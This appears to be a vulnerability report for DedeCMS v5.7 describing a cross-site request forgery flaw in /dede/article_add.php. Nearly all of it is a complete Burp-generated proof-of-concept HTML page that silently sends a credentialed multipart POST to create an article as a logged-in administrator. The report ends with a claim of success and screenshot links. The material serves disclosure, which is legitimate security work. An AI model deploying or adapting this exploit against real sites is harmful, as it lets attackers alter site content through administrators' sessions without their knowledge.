target:https://github.com/wdsunwq/DedeCMSv5
version: v5.7

DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /dede/article_add.php

![1](https://github.com/777erp/cms/assets/113673221/ef62479e-04d8-4a5f-a6f7-b355df9ff0dc)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/127.0.0.1\/src\/dede\/article_add.php", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------127311673935295406842799167608");
        xhr.withCredentials = true;
        var body = "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"channelid\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"dopost\"\r\n" + 
          "\r\n" + 
          "save\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"title\"\r\n" + 
          "\r\n" + 
          "cs\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"shorttitle\"\r\n" + 
          "\r\n" + 
          "cs\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"redirecturl\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"tags\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"weight\"\r\n" + 
          "\r\n" + 
          "92\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"picname\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"litpic\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"source\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"writer\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"typeid\"\r\n" + 
          "\r\n" + 
          "2\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"typeid2\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"keywords\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"autokey\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"description\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"dede_addonfields\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"remote\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"autolitpic\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"needwatermark\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"sptype\"\r\n" + 
          "\r\n" + 
          "hand\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"spsize\"\r\n" + 
          "\r\n" + 
          "5\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"body\"\r\n" + 
          "\r\n" + 
          "cs\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"voteid\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"notpost\"\r\n" + 
          "\r\n" + 
          "0\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"click\"\r\n" + 
          "\r\n" + 
          "137\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"sortup\"\r\n" + 
          "\r\n" + 
          "0\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"color\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"arcrank\"\r\n" + 
          "\r\n" + 
          "0\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"money\"\r\n" + 
          "\r\n" + 
          "0\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"pubdate\"\r\n" + 
          "\r\n" + 
          "2024-03-01 11:11:01\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"ishtml\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"filename\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"templet\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"imageField.x\"\r\n" + 
          "\r\n" + 
          "18\r\n" + 
          "-----------------------------127311673935295406842799167608\r\n" + 
          "Content-Disposition: form-data; name=\"imageField.y\"\r\n" + 
          "\r\n" + 
          "10\r\n" + 
          "-----------------------------127311673935295406842799167608--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```

![2](https://github.com/777erp/cms/assets/113673221/b5e8c063-6d64-4d9a-be3b-ef13ef8458af)


Successed

![3](https://github.com/777erp/cms/assets/113673221/a7e80538-8974-4a46-9403-7ca809634339)

